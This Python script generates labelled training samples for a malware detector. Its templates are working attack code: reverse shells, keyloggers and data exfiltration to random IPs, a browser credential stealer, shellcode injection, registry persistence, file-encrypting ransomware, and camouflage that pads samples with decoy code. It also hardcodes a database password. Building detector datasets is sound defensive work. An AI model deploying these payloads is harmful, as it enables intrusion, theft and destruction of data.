"""
ScriptGuard Dataset Augmentation Generator v2.1
Generates diverse malicious and hard-benign samples targeting
benchmark failure archetypes identified in evaluation.

Improvements over v2.0:
- maybe_add_junk_code() with 8 templates and parametric n
- 3 structural variants per archetype
- Camouflage helpers: decoy imports, comments, function wrapping
- No noise_project(), no broken AST mutators

Usage:
    python generate_samples_v2.py --n 300 --dry-run
    python generate_samples_v2.py --n 300
    python generate_samples_v2.py --n 500 --arch keylogger
    python generate_samples_v2.py --list
"""

import argparse
import hashlib
import json
import os
import random
import string
import textwrap
from typing import Callable

import psycopg2
from psycopg2.extras import execute_values

# --- DB CONFIG ---
DB_CONFIG = {
    "dbname": os.getenv("POSTGRES_DB", "scriptguard"),
    "user": os.getenv("POSTGRES_USER", "admin"),
    "password": os.getenv("POSTGRES_PASSWORD", "6B3D5E2DAE25985662AC344AA3A1AFAAFE1465958CE7CF6528421F229244D41E"),
    "host": os.getenv("POSTGRES_HOST", "localhost"),
    "port": os.getenv("POSTGRES_PORT", "5432"),
}

# ==============================================================================
# HELPERS
# ==============================================================================

def rnd_name(n: int = 8) -> str:
    return "".join(random.choice(string.ascii_lowercase) for _ in range(n))

def rnd_ip() -> str:
    return f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"

def rnd_port() -> int:
    return random.randint(4000, 9999)

def maybe_wrap_in_func(code: str) -> str:
    if random.random() < 0.5:
        fname = rnd_name()
        indented = textwrap.indent(code, "    ")
        return f"def {fname}():\n{indented}\n\n{fname}()"
    return code

def maybe_add_decoy_imports() -> str:
    decoys = [
        "import logging",
        "import argparse",
        "import time",
        "import sys",
        "import os.path",
        "from typing import Optional",
        "from pathlib import Path",
        "import json",
        "import re",
        "import datetime",
    ]
    n = random.randint(0, 3)
    chosen = random.sample(decoys, min(n, len(decoys)))
    return "\n".join(chosen) + ("\n" if chosen else "")

def maybe_add_comment() -> str:
    comments = [
        f"# {rnd_name()} utility",
        "# helper module",
        "# internal use only",
        f"# version {random.randint(1,5)}.{random.randint(0,9)}",
        f"# {rnd_name(12)}",
        "",
    ]
    return random.choice(comments)

def maybe_add_junk_code(n: int = 1) -> str:
    templates = [
        lambda: f"{rnd_name()} = [x * {random.randint(2,9)} for x in range({random.randint(10,200)}) if x % {random.randint(2,5)} == 0]",
        lambda: f"{rnd_name()} = ({random.randint(1,999)} * {random.randint(1,999)}) // {random.randint(1,99)} + {random.randint(0,50)}",
        lambda: f"{rnd_name()} = {{k: v for k, v in enumerate(range({random.randint(5,20)}))}}",
        lambda: f"{rnd_name()} = '{rnd_name(12)}'.upper().replace('{rnd_name(3)}', '')",
        lambda: f"try:\n    {rnd_name()} = int('{random.randint(0,999)}')\nexcept ValueError:\n    pass",
        lambda: f"if {random.randint(0,0)}:\n    {rnd_name()} = '{rnd_name()}'",
        lambda: f"for {rnd_name(1)} in range({random.randint(0,2)}): pass",
        lambda: f"def {rnd_name()}() -> None:\n    return None",
    ]
    lines = [random.choice(templates)() for _ in range(n)]
    return "\n".join(lines)

def with_junk(code: str) -> str:
    if random.random() < 0.4:
        junk = maybe_add_junk_code(random.randint(1, 3))
        if random.random() < 0.5:
            return junk + "\n" + code
        return code + "\n" + junk
    return code


# Realistic padding blocks that appear in real scripts — utility functions,
# config dicts, logging setup, argparse boilerplate, dataclass definitions.
_PADDING_BLOCKS = [
    lambda: f"""import logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s %(levelname)s %(message)s')
logger = logging.getLogger('{rnd_name()}')""",

    lambda: f"""import argparse
parser = argparse.ArgumentParser(description='{rnd_name(12)}')
parser.add_argument('--{rnd_name(5)}', type=str, default='{rnd_name()}')
parser.add_argument('--{rnd_name(5)}', type=int, default={random.randint(1, 100)})
args = parser.parse_args()""",

    lambda: f"""CONFIG = {{
    '{rnd_name(5)}': '{rnd_name(10)}',
    '{rnd_name(5)}': {random.randint(1, 9999)},
    '{rnd_name(5)}': {random.choice([True, False])},
    '{rnd_name(5)}': None,
}}""",

    lambda: f"""import os
from pathlib import Path

BASE_DIR = Path(__file__).parent.resolve()
DATA_DIR = BASE_DIR / '{rnd_name()}'
LOG_DIR  = BASE_DIR / 'logs'

for d in (DATA_DIR, LOG_DIR):
    d.mkdir(parents=True, exist_ok=True)""",

    lambda: (lambda names: f"""def {names[0]}(x: float) -> float:
    return x * {random.uniform(0.1, 9.9):.3f} + {random.uniform(-5.0, 5.0):.3f}

def {names[1]}(items: list) -> list:
    return sorted(set(items), key=lambda v: (isinstance(v, str), v))

def {names[2]}(d: dict, key: str, default=None):
    return d.get(key, default)""")(
        [rnd_name() for _ in range(3)]
    ),

    lambda: f"""import json, os

def {rnd_name()}(path: str) -> dict:
    if not os.path.exists(path):
        return {{}}
    with open(path, 'r', encoding='utf-8') as fh:
        return json.load(fh)

def {rnd_name()}(path: str, data: dict) -> None:
    with open(path, 'w', encoding='utf-8') as fh:
        json.dump(data, fh, indent=2, ensure_ascii=False)""",

    lambda: f"""import time, functools

def {rnd_name()}(fn):
    @functools.wraps(fn)
    def wrapper(*args, **kwargs):
        t0 = time.perf_counter()
        result = fn(*args, **kwargs)
        elapsed = time.perf_counter() - t0
        print(f'{{fn.__name__}} took {{elapsed:.4f}}s')
        return result
    return wrapper""",

    lambda: f"""import re

{rnd_name().upper()}_PATTERN = re.compile(r'{rnd_name(3)}[\\w.-]{{2,}}@[\\w-]{{2,}}\\.[a-z]{{2,4}}')
{rnd_name().upper()}_URL     = re.compile(r'https?://[\\w./-]{{5,}}')

def {rnd_name()}(text: str) -> dict:
    return {{
        'emails': {rnd_name().upper()}_PATTERN.findall(text),
        'urls':   {rnd_name().upper()}_URL.findall(text),
    }}""",

    lambda: f"""from dataclasses import dataclass, field
from typing import List, Optional

@dataclass
class {rnd_name(6).capitalize()}:
    {rnd_name(5)}: str
    {rnd_name(5)}: int = {random.randint(0, 100)}
    {rnd_name(5)}: Optional[str] = None
    {rnd_name(5)}: List[str] = field(default_factory=list)

    def {rnd_name()}(self) -> str:
        return f'{{self.__class__.__name__}}({{self.{rnd_name(5)}}})'""",

    lambda: f"""import hashlib, hmac, secrets

def {rnd_name()}(msg: bytes, key: bytes) -> str:
    return hmac.new(key, msg, hashlib.sha256).hexdigest()

def {rnd_name()}(n: int = 32) -> bytes:
    return secrets.token_bytes(n)

def {rnd_name()}(a: str, b: str) -> bool:
    return hmac.compare_digest(a.encode(), b.encode())""",
]


def maybe_extend_script(code: str) -> str:
    # Target length bucket: short (keep as-is), medium, long, very long
    bucket = random.choices(
        ["short", "medium", "long", "very_long"],
        weights=[0.20, 0.40, 0.30, 0.10],
    )[0]

    n_blocks = {
        "short":     0,
        "medium":    random.randint(1, 3),
        "long":      random.randint(4, 8),
        "very_long": random.randint(9, 16),
    }[bucket]

    if n_blocks == 0:
        return code

    blocks = [random.choice(_PADDING_BLOCKS)() for _ in range(n_blocks)]

    # Randomly interleave blocks before/after core code
    prefix_n = random.randint(0, len(blocks))
    prefix = "\n\n".join(blocks[:prefix_n])
    suffix = "\n\n".join(blocks[prefix_n:])

    parts = [p for p in [prefix, code, suffix] if p]
    return "\n\n".join(parts)


# ==============================================================================
# MALICIOUS GENERATORS
# ==============================================================================

def gen_stealth_persistence() -> str:
    key = random.choice(["WinUpdate", "OneDriveHealth", "WinDefService", "SystemSync", "MsEdgeUpdater"])
    variants = [
        (lambda fn: f"""{maybe_add_decoy_imports()}
import winreg, os

def {fn}():
    k = winreg.HKEY_CURRENT_USER
    p = r'Software\\Microsoft\\Windows\\CurrentVersion\\Run'
    with winreg.OpenKey(k, p, 0, winreg.KEY_WRITE) as r:
        winreg.SetValueEx(r, '{key}', 0, winreg.REG_SZ, os.path.realpath(__file__))

{fn}()""")(rnd_name()),

        f"""import winreg, os, sys

def {rnd_name()}(path=None):
    path = path or sys.executable
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r'Software\\Microsoft\\Windows\\CurrentVersion\\Run',
            0, winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, '{key}', 0, winreg.REG_SZ, path)
        winreg.CloseKey(key)
    except Exception:
        pass""",

        f"""import winreg, os

LOCATIONS = [
    (winreg.HKEY_CURRENT_USER, r'Software\\Microsoft\\Windows\\CurrentVersion\\Run'),
    (winreg.HKEY_LOCAL_MACHINE, r'Software\\Microsoft\\Windows\\CurrentVersion\\Run'),
]

for hive, subkey in LOCATIONS:
    try:
        with winreg.OpenKey(hive, subkey, 0, winreg.KEY_WRITE) as k:
            winreg.SetValueEx(k, '{key}', 0, winreg.REG_SZ, os.path.abspath(__file__))
        break
    except PermissionError:
        continue""",
    ]
    return with_junk(random.choice(variants))


def gen_mem_inject() -> str:
    variants = [
        f"""{maybe_add_comment()}
import ctypes

def {rnd_name()}(pid: int, shellcode: bytes) -> bool:
    kernel32 = ctypes.windll.kernel32
    h = kernel32.OpenProcess(0x1F0FFF, False, pid)
    if not h:
        return False
    addr = kernel32.VirtualAllocEx(h, 0, len(shellcode), 0x3000, 0x40)
    kernel32.WriteProcessMemory(h, addr, shellcode, len(shellcode), 0)
    kernel32.CreateRemoteThread(h, None, 0, addr, None, 0, None)
    kernel32.CloseHandle(h)
    return True""",

        f"""import mmap, ctypes, os

def {rnd_name()}(payload: bytes) -> None:
    mm = mmap.mmap(-1, len(payload), mmap.MAP_SHARED | mmap.MAP_ANONYMOUS,
                   mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC)
    mm.write(payload)
    mm.seek(0)
    buf = (ctypes.c_char * len(payload)).from_buffer(mm)
    fn = ctypes.cast(buf, ctypes.CFUNCTYPE(None))
    fn()""",

        f"""import ctypes

def {rnd_name()}(sc: bytes) -> None:
    ptr = ctypes.windll.kernel32.VirtualAlloc(
        ctypes.c_int(0), ctypes.c_int(len(sc)),
        ctypes.c_int(0x3000), ctypes.c_int(0x40)
    )
    buf = (ctypes.c_char * len(sc)).from_buffer_copy(sc)
    ctypes.windll.kernel32.RtlMoveMemory(
        ctypes.c_int(ptr), buf, ctypes.c_int(len(sc))
    )
    ht = ctypes.windll.kernel32.CreateThread(
        ctypes.c_int(0), ctypes.c_int(0), ctypes.c_int(ptr),
        ctypes.c_int(0), ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0))
    )
    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))""",
    ]
    return with_junk(random.choice(variants))


def gen_port_scan() -> str:
    r1, r2 = random.randint(1, 80), random.randint(400, 1024)
    timeout = round(random.uniform(0.1, 1.0), 1)
    fname = rnd_name()
    variants = [
        f"""{maybe_add_decoy_imports()}
import socket

def {fname}(host: str, ports=range({r1}, {r2})) -> list:
    open_ports = []
    for port in ports:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout({timeout})
        if s.connect_ex((host, port)) == 0:
            open_ports.append(port)
        s.close()
    return open_ports""",

        f"""import socket, threading

results = []
_lock = threading.Lock()

def {rnd_name()}(host: str, port: int) -> None:
    try:
        s = socket.create_connection((host, port), timeout={timeout})
        with _lock:
            results.append(port)
        s.close()
    except (socket.timeout, ConnectionRefusedError, OSError):
        pass

def {fname}(host: str) -> list:
    threads = [threading.Thread(target={rnd_name()}, args=(host, p)) for p in range({r1}, {r2})]
    for t in threads: t.start()
    for t in threads: t.join()
    return sorted(results)""",

        f"""import socket

{fname} = lambda h, p: socket.socket().connect_ex((h, p)) == 0
open_ports = [p for p in range({r1}, {r2}) if {fname}('{rnd_ip()}', p)]
print(open_ports)""",
    ]
    return with_junk(random.choice(variants))


def gen_creds_stealer() -> str:
    path = random.choice(["Login Data", "Web Data", "Cookies"])
    browser = random.choice(["Google\\\\Chrome", "BraveSoftware\\\\Brave-Browser", "Microsoft\\\\Edge"])
    variants = [
        f"""{maybe_add_comment()}
import os, sqlite3, shutil, tempfile

def {rnd_name()}() -> list:
    src = os.path.join(
        os.getenv('LOCALAPPDATA'),
        r'{browser}\\User Data\\Default\\{path}'
    )
    tmp = os.path.join(tempfile.gettempdir(), '{rnd_name()}.db')
    shutil.copy2(src, tmp)
    conn = sqlite3.connect(tmp)
    rows = conn.execute('SELECT origin_url, username_value, password_value FROM logins').fetchall()
    conn.close()
    os.remove(tmp)
    return rows""",

        f"""import os, sqlite3, shutil

DB_PATH = os.path.expandvars(
    r'%LOCALAPPDATA%\\{browser}\\User Data\\Default\\{path}'
)

def {rnd_name()}():
    shutil.copy(DB_PATH, 't.db')
    with sqlite3.connect('t.db') as c:
        yield from c.execute('SELECT * FROM logins')""",
    ]
    return with_junk(random.choice(variants))


def gen_keylogger() -> str:
    variants = [
        f"""{maybe_add_comment()}
import pynput.keyboard as kb

_log = []

def {rnd_name()}(key):
    try:
        _log.append(key.char)
    except AttributeError:
        _log.append(f'[{{key}}]')

with kb.Listener(on_press={rnd_name()}) as listener:
    listener.join()""",

        f"""from pynput import keyboard
import requests

ENDPOINT = 'http://{rnd_ip()}/{rnd_name()}'
buf = []

def on_press(key):
    try:
        buf.append(key.char)
    except AttributeError:
        buf.append(str(key))
    if len(buf) > 50:
        requests.post(ENDPOINT, data={{'keys': ''.join(buf)}})
        buf.clear()

with keyboard.Listener(on_press=on_press) as l:
    l.join()""",

        f"""import ctypes, time

def {rnd_name()}():
    log = []
    while True:
        for i in range(8, 190):
            if ctypes.windll.user32.GetAsyncKeyState(i) & 0x8000:
                log.append(chr(i))
        time.sleep(0.01)
    return log""",
    ]
    return with_junk(random.choice(variants))


def gen_reverse_shell() -> str:
    ip = rnd_ip()
    port = rnd_port()
    variants = [
        (lambda fn: f"""{maybe_add_comment()}
import socket, os, pty

def {fn}():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('{ip}', {port}))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    pty.spawn('/bin/bash')

{fn}()""")(rnd_name()),

        f"""import socket, subprocess

s = socket.socket()
s.connect(('{ip}', {port}))
while True:
    cmd = s.recv(1024).decode()
    if cmd.lower() == 'exit':
        break
    out = subprocess.run(cmd, shell=True, capture_output=True)
    s.send(out.stdout + out.stderr)
s.close()""",

        (lambda fn: f"""import socket, os, time

HOST, PORT = '{ip}', {port}

def {fn}():
    while True:
        try:
            s = socket.socket()
            s.connect((HOST, PORT))
            while True:
                data = s.recv(4096)
                if not data: break
                out = os.popen(data.decode()).read()
                s.send(out.encode())
            s.close()
        except Exception:
            time.sleep({random.randint(5, 30)})

{fn}()""")(rnd_name()),
    ]
    return with_junk(random.choice(variants))


def gen_subprocess_injection() -> str:
    variants = [
        f"""{maybe_add_decoy_imports()}
import subprocess

def {rnd_name()}(user_input: str) -> str:
    cmd = f'echo {{user_input}}'
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return result.stdout""",

        f"""import subprocess, sys

def {rnd_name()}(query: str) -> bytes:
    proc = subprocess.Popen(
        f'grep {{query}} /etc/passwd',
        shell=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )
    out, _ = proc.communicate()
    return out""",

        f"""import subprocess

user_cmd = input('Enter command: ')
subprocess.call(user_cmd, shell=True)""",
    ]
    return with_junk(random.choice(variants))


def gen_obf_reflection() -> str:
    cmd = random.choice(["whoami", "hostname", "net user", "dir", "id", "uname -a"])
    variants = [
        f"""m = __import__('os')
f = getattr(m, 'system')
f('{cmd}')""",
        f"""getattr(__import__('os'), 'system')('{cmd}')""",
        f"""import importlib
m = importlib.import_module('os')
getattr(m, 'system')('{cmd}')""",
        f"""mod = __import__('subprocess')
getattr(mod, 'call')('{cmd}', shell=True)""",
        f"""import importlib, sys
mod_name = 'o' + 's'
m = importlib.import_module(mod_name)
m.system('{cmd}')""",
    ]
    return with_junk(random.choice(variants))


def gen_obf_chr_concat() -> str:
    cmd = random.choice(["calc", "notepad", "whoami", "powershell", "cmd", "net user"])
    chrs = ", ".join([f"chr({ord(c)})" for c in cmd])
    variants = [
        f"""import os
getattr(os, 'system')(''.join([{chrs}]))""",
        f"""import os
cmd = ''.join(map(chr, [{', '.join(str(ord(c)) for c in cmd)}]))
os.system(cmd)""",
        f"""import os
parts = [{chrs}]
os.system(''.join(parts))""",
    ]
    return with_junk(random.choice(variants))


def gen_obf_lambda() -> str:
    cmd = random.choice(["whoami", "ipconfig /all", "netstat -ano", "id", "ps aux"])
    variants = [
        f"""import os
(lambda x: x.system('{cmd}'))(__import__('os'))""",
        f"""(lambda f, a: f(a))(getattr(__import__('os'), 'system'), '{cmd}')""",
        f"""list(map(lambda x: __import__('os').system(x), ['{cmd}']))""",
        f"""import os
fn = lambda c: os.system(c)
fn('{cmd}')""",
    ]
    return with_junk(random.choice(variants))


def gen_globals_exec() -> str:
    cmd = random.choice(["whoami", "id", "hostname", "net user"])
    variants = [
        (lambda fn: f"""def {fn}():
    g = globals()
    b = g['__builtins__']
    if isinstance(b, dict):
        b['exec']('import os; os.system("{cmd}")')
    else:
        getattr(b, 'exec')('import os; os.system("{cmd}")')

{fn}()""")(rnd_name()),
        f"""import builtins
getattr(builtins, 'exec')('import os; os.system("{cmd}")')""",
        f"""globals()['__builtins__']['__import__']('os').system('{cmd}')""",
    ]
    return with_junk(random.choice(variants))


def gen_data_exfil() -> str:
    ip = rnd_ip()
    port = rnd_port()
    variants = [
        (lambda fn: f"""{maybe_add_comment()}
import os, socket, platform

def {fn}():
    info = {{
        'host': platform.node(),
        'user': os.getenv('USERNAME') or os.getenv('USER'),
        'os': platform.system(),
        'cwd': os.getcwd(),
    }}
    s = socket.socket()
    s.connect(('{ip}', {port}))
    s.send(str(info).encode())
    s.close()

{fn}()""")(rnd_name()),

        f"""import requests, os, getpass

payload = {{
    'user': getpass.getuser(),
    'hostname': os.uname().nodename,
    'files': os.listdir(os.path.expanduser('~'))
}}
requests.post('http://{ip}:{port}/collect', json=payload)""",
    ]
    return with_junk(random.choice(variants))


def gen_ransomware() -> str:
    variants = [
        f"""{maybe_add_comment()}
import os
from cryptography.fernet import Fernet

KEY = Fernet.generate_key()
f = Fernet(KEY)

def {rnd_name()}(directory: str) -> None:
    for root, _, files in os.walk(directory):
        for fname in files:
            if fname.endswith('.enc'):
                continue
            path = os.path.join(root, fname)
            with open(path, 'rb') as fh:
                data = fh.read()
            with open(path + '.enc', 'wb') as fh:
                fh.write(f.encrypt(data))
            os.remove(path)""",

        f"""import os, struct
from Crypto.Cipher import AES

def {rnd_name()}(filepath: str, key: bytes) -> None:
    cipher = AES.new(key, AES.MODE_EAX)
    with open(filepath, 'rb') as fh:
        data = fh.read()
    ciphertext, tag = cipher.encrypt_and_digest(data)
    with open(filepath + '.locked', 'wb') as fh:
        for chunk in (cipher.nonce, tag, ciphertext):
            fh.write(struct.pack('<H', len(chunk)))
            fh.write(chunk)
    os.remove(filepath)""",
    ]
    return with_junk(random.choice(variants))


# ==============================================================================
# HARD BENIGN GENERATORS
# ==============================================================================

def gen_hard_benign_devops() -> str:
    variants = [
        f"""import paramiko

def {rnd_name()}(host: str, user: str, password: str) -> str:
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(host, username=user, password=password)
    _, stdout, stderr = client.exec_command('ls -la /var/log')
    output = stdout.read().decode()
    client.close()
    return output""",

        f"""import paramiko, os

def {rnd_name()}(host: str, key_path: str, remote: str, local: str) -> None:
    key = paramiko.RSAKey.from_private_key_file(os.path.expanduser(key_path))
    transport = paramiko.Transport((host, 22))
    transport.connect(username='ubuntu', pkey=key)
    sftp = paramiko.SFTPClient.from_transport(transport)
    sftp.get(remote, local)
    sftp.close()
    transport.close()""",
    ]
    return with_junk(random.choice(variants))


def gen_hard_benign_cloud() -> str:
    bucket = f"company-backup-{random.randint(100, 999)}"
    region = random.choice(["us-east-1", "eu-west-1", "ap-southeast-1"])
    variants = [
        f"""import boto3
from pathlib import Path

def sync_{rnd_name()}(file_path: str, bucket: str = '{bucket}') -> None:
    s3 = boto3.client('s3', region_name='{region}')
    s3.upload_file(file_path, bucket, Path(file_path).name)
    print(f'Uploaded {{file_path}} to s3://{{bucket}}')""",

        f"""import boto3

def {rnd_name()}(bucket: str = '{bucket}') -> list:
    s3 = boto3.resource('s3', region_name='{region}')
    return [obj.key for obj in s3.Bucket(bucket).objects.all()]""",
    ]
    return with_junk(random.choice(variants))


def gen_hard_benign_subprocess() -> str:
    variants = [
        f"""import subprocess, logging

logger = logging.getLogger(__name__)

def {rnd_name()}(cmd: list) -> tuple:
    logger.info(f'Running: {{cmd}}')
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        return result.stdout, result.returncode
    except subprocess.TimeoutExpired:
        logger.error('Command timed out')
        return '', -1""",

        f"""import subprocess, os

def {rnd_name()}(script_path: str) -> int:
    env = {{**os.environ, 'PYTHONDONTWRITEBYTECODE': '1'}}
    proc = subprocess.Popen(
        ['python', script_path],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        env=env
    )
    for line in proc.stdout:
        print(line.decode(), end='')
    return proc.wait()""",
    ]
    return with_junk(random.choice(variants))


def gen_hard_benign_socket() -> str:
    port = random.choice([80, 443, 8080, 8443])
    variants = [
        f"""import socket

def {rnd_name()}(host: str, port: int = {port}, timeout: float = 3.0) -> bool:
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.close()
        return True
    except (socket.timeout, ConnectionRefusedError, OSError):
        return False""",

        f"""import socket, ssl

def {rnd_name()}(host: str) -> str:
    ctx = ssl.create_default_context()
    with socket.create_connection((host, 443)) as sock:
        with ctx.wrap_socket(sock, server_hostname=host) as ssock:
            ssock.send(b'GET / HTTP/1.1\\r\\nHost: ' + host.encode() + b'\\r\\n\\r\\n')
            return ssock.recv(4096).decode(errors='ignore')""",
    ]
    return with_junk(random.choice(variants))


def gen_hard_benign_data() -> str:
    col1, col2 = rnd_name(5), rnd_name(5)
    variants = [
        f"""import pandas as pd
import numpy as np

def process_{rnd_name()}(filepath: str) -> pd.DataFrame:
    df = pd.read_csv(filepath)
    df['{col1}'] = np.log1p(df['{col2}'].clip(lower=0))
    return df.groupby('{col1}').agg({{'value': ['mean', 'std', 'count']}})""",

        f"""import pandas as pd

def {rnd_name()}(df: pd.DataFrame) -> dict:
    return {{
        'shape': df.shape,
        'nulls': df.isnull().sum().to_dict(),
        'dtypes': df.dtypes.astype(str).to_dict(),
        'describe': df.describe().to_dict()
    }}""",
    ]
    return with_junk(random.choice(variants))


def gen_hard_benign_crypto() -> str:
    variants = [
        f"""import hashlib, os, base64

def {rnd_name()}(password: str) -> str:
    salt = os.urandom(32)
    key = hashlib.pbkdf2_hmac('sha256', password.encode(), salt, 100000)
    return base64.b64encode(salt + key).decode()

def {rnd_name()}(password: str, stored: str) -> bool:
    raw = base64.b64decode(stored)
    salt, key = raw[:32], raw[32:]
    check = hashlib.pbkdf2_hmac('sha256', password.encode(), salt, 100000)
    return check == key""",

        f"""import secrets, hashlib

def {rnd_name()}(length: int = 32) -> str:
    return secrets.token_urlsafe(length)

def {rnd_name()}(data: str) -> str:
    return hashlib.sha256(data.encode()).hexdigest()""",
    ]
    return with_junk(random.choice(variants))


# ==============================================================================
# ARCHETYPE REGISTRY
# ==============================================================================

ARCHETYPES: dict[str, tuple[str, Callable]] = {
    # --- MALICIOUS ---
    "stealth_persistence":    ("malicious", gen_stealth_persistence),
    "mem_inject":             ("malicious", gen_mem_inject),
    "port_scan":              ("malicious", gen_port_scan),
    "creds_stealer":          ("malicious", gen_creds_stealer),
    "keylogger":              ("malicious", gen_keylogger),
    "reverse_shell":          ("malicious", gen_reverse_shell),
    "subprocess_injection":   ("malicious", gen_subprocess_injection),
    "obf_reflection":         ("malicious", gen_obf_reflection),
    "obf_chr_concat":         ("malicious", gen_obf_chr_concat),
    "obf_lambda":             ("malicious", gen_obf_lambda),
    "globals_exec":           ("malicious", gen_globals_exec),
    "data_exfil":             ("malicious", gen_data_exfil),
    "ransomware":             ("malicious", gen_ransomware),
    # --- HARD BENIGN ---
    "hard_benign_devops":     ("benign", gen_hard_benign_devops),
    "hard_benign_cloud":      ("benign", gen_hard_benign_cloud),
    "hard_benign_subprocess": ("benign", gen_hard_benign_subprocess),
    "hard_benign_socket":     ("benign", gen_hard_benign_socket),
    "hard_benign_data":       ("benign", gen_hard_benign_data),
    "hard_benign_crypto":     ("benign", gen_hard_benign_crypto),
}


# ==============================================================================
# CORE LOGIC
# ==============================================================================

def generate_samples(n_per_arch: int, archetypes: list[str]) -> list[tuple]:
    rows = []
    for arch in archetypes:
        label, gen_fn = ARCHETYPES[arch]
        print(f"  Generating {n_per_arch}x [{label:9}] {arch}...")
        seen: set[str] = set()
        attempts = 0
        while len(seen) < n_per_arch and attempts < n_per_arch * 20:
            attempts += 1
            try:
                content = gen_fn()
                content = maybe_extend_script(content)
            except Exception as e:
                print(f"    WARNING: generator error for {arch}: {e}")
                continue
            h = hashlib.sha256(content.encode()).hexdigest()
            if h in seen:
                continue
            seen.add(h)
            metadata = json.dumps({
                "category": arch,
                "gen_version": "2.1",
                "batch": "augmentation_v21_benchmark_fix",
            })
            rows.append((h, content, label, f"augmentation_v21_{arch}", metadata))
        print(f"    -> {len(seen)} unique samples ({attempts} attempts)")
    return rows


def insert_to_db(rows: list[tuple]) -> int:
    conn = psycopg2.connect(**DB_CONFIG)
    query = """
        INSERT INTO public.samples (content_hash, content, label, source, metadata)
        VALUES %s
        ON CONFLICT (content_hash) DO NOTHING
    """
    with conn.cursor() as cur:
        execute_values(cur, query, rows)
    with conn.cursor() as cur:
        cur.execute("SELECT COUNT(*) FROM public.samples WHERE source LIKE 'augmentation_v21%'")
        count = cur.fetchone()[0]
    conn.commit()
    conn.close()
    return count


# ==============================================================================
# MAIN
# ==============================================================================

def main():
    parser = argparse.ArgumentParser(description="ScriptGuard augmentation generator v2.1")
    parser.add_argument("--n", type=int, default=300, help="Samples per archetype (default: 300)")
    parser.add_argument("--arch", type=str, default=None, help="Single archetype (default: all)")
    parser.add_argument("--dry-run", action="store_true", help="Preview only, no DB insert")
    parser.add_argument("--list", action="store_true", help="List archetypes and exit")
    args = parser.parse_args()

    if args.list:
        print("\nAvailable archetypes:")
        for name, (label, _) in ARCHETYPES.items():
            print(f"  [{label:9}] {name}")
        return

    archetypes = [args.arch] if args.arch else list(ARCHETYPES.keys())
    invalid = [a for a in archetypes if a not in ARCHETYPES]
    if invalid:
        print(f"ERROR: Unknown archetypes: {invalid}")
        print(f"Valid: {list(ARCHETYPES.keys())}")
        return

    total = len(archetypes) * args.n
    mal_archs = sum(1 for a in archetypes if ARCHETYPES[a][0] == "malicious")
    ben_archs = len(archetypes) - mal_archs

    print(f"\n{'='*60}")
    print(f"  ScriptGuard Augmentation Generator v2.1")
    print(f"  Archetypes : {len(archetypes)} ({mal_archs} malicious, {ben_archs} benign)")
    print(f"  Per arch   : {args.n}")
    print(f"  Total      : ~{total} samples")
    print(f"  Mode       : {'DRY RUN' if args.dry_run else 'INSERT TO DB'}")
    print(f"{'='*60}\n")

    rows = generate_samples(args.n, archetypes)

    mal = sum(1 for r in rows if r[2] == "malicious")
    ben = sum(1 for r in rows if r[2] == "benign")
    print(f"\nGenerated: {len(rows)} unique samples ({mal} malicious, {ben} benign)")

    if args.dry_run:
        print("\n[DRY RUN] First sample per archetype:\n")
        shown: set[str] = set()
        for r in rows:
            arch = r[3].replace("augmentation_v21_", "")
            if arch not in shown:
                shown.add(arch)
                print(f"{'─'*50}")
                print(f"[{r[2]:9}] {arch}")
                print(f"{'─'*50}")
                print(r[1][:400])
                print()
        return

    print("\nInserting to database...")
    try:
        count = insert_to_db(rows)
        print(f"\nSUCCESS: {len(rows)} samples processed")
        print(f"Total augmentation_v21 samples in DB: {count}")
    except Exception as e:
        print(f"\nERROR: {e}")
        raise


if __name__ == "__main__":
    main()